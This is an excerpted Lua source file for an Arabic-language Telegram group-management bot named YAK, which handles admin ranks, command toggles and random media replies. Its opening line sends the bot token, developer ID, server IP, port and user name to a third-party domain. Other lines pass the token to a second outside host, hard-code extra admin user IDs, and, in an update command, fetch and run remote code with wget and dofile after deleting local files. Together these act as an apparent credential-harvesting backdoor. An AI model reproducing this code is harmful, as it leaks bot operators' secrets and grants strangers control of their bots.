...
https.request("https://apiabs.ml/Api/YAK/index.php?Get=YAK&DevId="..DevALS:get(Server.."IdYAK").."&TokenBot="..DevALS:get(Server.."TokenYAK").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,1695110211,2076971531,1695110211}
YAK = Config.YAK
TokenBot = Config.TokenBot
NameBot = (DevALS:get(YAK..'ALS:NameBot') or 'يوكا')
--     Source YAK     --
...
FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ .•♫•♬•aLs•♬•♫•.┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
...
--     Source YAK     --
function ALSmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevALS:get(YAK..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source YAK     --
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/YAK/Yt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Song:"..data.sender_user_id_}},{{text=". TeAm YAK ☆",url="t.me/AAAVAA"}}} 
...
local Text ='*☆︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/mp3:"..data.sender_user_id_}},{{text=". TeAm YAK ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/memz:"..data.sender_user_id_}},{{text=". TeAm YAK ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/gif:"..data.sender_user_id_}},{{text=". TeAm YAK ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/photo:"..data.sender_user_id_}},{{text=". TeAm YAK ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/anime:"..data.sender_user_id_}},{{text=". TeAm YAK ☆",url="t.me/AAAVAA"}}} 
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..ALS},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..ALS}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..ALS},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..ALS}},{{text = '⌁ YAK TeAM.',url="t.me/AAAVAA"}}}
elseif Manager(data) then
...
┉ ┉ ┉ .•♫•♬•aLs•♬•♫•.┉ ┉ ┉ ┉
☆︙[Source Channel](https://t.me/AAAVAA)
]] 
keyboard = {} 
...
DevALS:set(YAK.."Set:Cmd:Group:New1"..data.chat_id_..":،،","مسح المكتومين")
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..data.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..data.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..data.sender_user_id_}},{{text="‹ TeAm YAK ›",url="t.me/AAAVAA"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard = {}
keyboard.inline_keyboard = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..data.sender_user_id_}},{{text="‹ TeAm YAK ›",url="t.me/AAAVAA"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
Text = "☆︙تم ترتيب الاوامر بالشكل التالي ~\n☆︙ ايدي - ا .\n☆︙ رفع مميز - م .\n☆︙رفع ادمن - اد .\n☆︙ رفع مدير - مد . \n☆︙ رفع منشى - من . \n☆︙ رفع منشئ الاساسي - اس  .\n☆︙ رفع مطور - مط .\n☆︙رفع مطور ثانوي - ثانوي .\n☆︙ تنزيل الكل - تك .\n☆︙ تعطيل الايدي بالصوره - تعط .\n☆︙ تفعيل الايدي بالصوره - تفع .\n☆︙ الرابط - ر .\n☆︙ ردود المدير - رر .\n☆︙ مسح المكتومين - ،، .\n☆︙ اضف رد - رد .\n☆︙ مسح سحكاتي - سح .\n☆︙ مسح رسائلي - رس .\n☆︙ غنيلي - غ .\n☆︙مسح قائمه العام"
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ رجوع ›",callback_data="/Reload:"..data.sender_user_id_}},{{text='‹ TeAm YAK ›',url="t.me/AAAVAA"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source David     --
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '☆ TeAm YAK .',url="t.me/AAAVAA"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
if text and text:match('^'..(DevALS:get(YAK..'ALS:NameBot') or "يوكا")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevALS:get(YAK..'ALS:NameBot') or "يوكا")..' ','')
end
...
DevALS:set(YAK.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
...
local BotName = (DevALS:get(YAK.."ALS:NameBot") or 'يوكا')
...
NameBot = (DevALS:get(YAK..'ALS:NameBot') or 'يوكا')
local YAKTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
...
if text and text == (DevALS:get(YAK..'ALS:NameBot') or 'يوكا') then 
NameBot = (DevALS:get(YAK..'ALS:NameBot') or 'يوكا')
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..ALS},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..ALS}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..ALS},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..ALS}},{{text = '⌁ YAK TeAM.',url="t.me/AAAVAA"}}}
elseif Manager(data) then
...
☆︙[𝚖𝚞𝚛𝚝𝚊𝚍𝚊 𝚖𝚘𝚑𝚊𝚖𝚖𝚎𝚍](https://t.me/X444F)
]]
keyboard = {} 
...
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم تفعيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source YAK     --
--          Kick          --
...
keyboard = {} 
keyboard.inline_keyboard = {{{text=''..dp.first_name_..'',url="t.me/"..dp.username_ or AAAVAA}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..getpro.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
...
--     Source YAK     --
if text == "المطورين الاساسيين" and ChCheck(msg) and ALSSudo(msg) or text == "الاساسيين" and ALSSudo(msg) and ChCheck(msg) or text == "↫ الاساسيين ☆" and ALSSudo(msg) and ChCheck(msg) then 
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح الاساسيين",callback_data="/DelALSSudo:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     Source YAK     --
...
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     Source YAK     --
...
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل المتحركه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(YAK..'ALS:gif:ALS'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل المتحركه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(YAK..'ALS:gif:ALS'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ☆") and not DevALS:get(YAK..'ALS:gif:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1075); 
local Text ='*☆︙تم اختيار المتحركه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/gif:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifDavid/'..ALS..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source YAK     --
if text == "تفعيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تفعيل الميمز" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الميمز'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(YAK..'ALS:memz:ALS'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الميمز'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(YAK..'ALS:memz:ALS'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ☆") and not DevALS:get(YAK..'ALS:memz:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1201); 
local Text ='*☆︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/memz:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzDavid/'..ALS..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source YAK     --
...
local Text ='*☆︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Song:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الاغاني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(YAK..'ALS:mp3:ALS'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الاغاني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(YAK..'ALS:mp3:ALS'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ☆" or text == "اغاني") and not DevALS:get(YAK..'ALS:mp3:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,1167); 
local Text ='*☆︙تم اختيار الاغنيه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/mp3:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id=' .. msg.chat_id_ .. '&audio=https://t.me/DavidMp3/'..ALS..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source YAK     --
if text == "تفعيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تفعيل الريمكس" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الريمكس'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(YAK..'ALS:Remix:ALS'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الريمكس'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(YAK..'ALS:Remix:ALS'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ☆") and not DevALS:get(YAK..'ALS:Remix:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(2,612); 
local Text ='*☆︙تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/remix:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixDavid/'..ALS..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source YAK     --
if text == "تفعيل صوره" and Manager(msg) and ChCheck(msg) or text == "تفعيل الصوره" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(YAK..'ALS:Photo:ALS'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local YAKTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الصوره'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, YAKTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(YAK..'ALS:Photo:ALS'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ☆") and not DevALS:get(YAK..'ALS:Photo:ALS'..msg.chat_id_) and ChCheck(msg) then
ALS = math.random(4,1171); 
local Text ='*☆︙تم اختيار الصوره لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/photo:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosDavid/'..ALS..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source YAK     --
...
local Text ='*☆︙تم اختيار صورة الانمي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/anime:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Movies:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/series:"..msg.sender_user_id_}},{{text = '☆ YAK Team .',url="t.me/AAAVAA"}}} 
local msg_id = msg.id_/2097152/0.5 
...
Text = "☆︙تم تفعيل المجموعه "..dp.title_
local inline = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..msg.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..msg.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..msg.sender_user_id_}},{{text="‹ TeAm YAK ›",url="t.me/AAAVAA"}}}
...
Text = "☆︙تم تعطيل المجموعه "..dp.title_
local inline = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..msg.sender_user_id_}},{{text="‹ TeAm YAK ›",url="t.me/AAAVAA"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
DevALS:srem(YAK.."ALS:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
local msg_id = msg.id_/2097152/0.5 
https.request('https://ccccxcc.ml/YAK/Yt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source YAK     --
if SecondSudo(msg) then
if text == "تحديث السورس" and ChCheck(msg) or text == "تحديث سورس" and ChCheck(msg) or text == "↫ تحديث السورس ☆" and ChCheck(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙جاري تحديث سورس يوكا', 1, 'md') 
os.execute('rm -rf YAK.lua') 
os.execute('wget https://raw.githubusercontent.com/YAK-TEAD/YAK/main/YAK.lua') 
dofile('YAK.lua') 
io.popen("rm -rf ../.telegram-cli/*")
...
DevALS:set(YAK..'ALS:NameBot',(DevALS:get(YAK..'Name:Bot') or 'يوكا'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
...
Text = [[
☆︙[قناة السورس](https://t.me/AAAVAA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '☆ قناة السورس',url="t.me/AAAVAA"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AAAVAA&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
------------------------------------------------
-- This Source Was Developed By (ALS) https://t.me/X444F .--
--   This Is The Source Channel https://t.me/AAAVAA .   --
--                - YAK -                 --
--        -- https://t.me/AAAVAA --         --
------------------------------------------------   
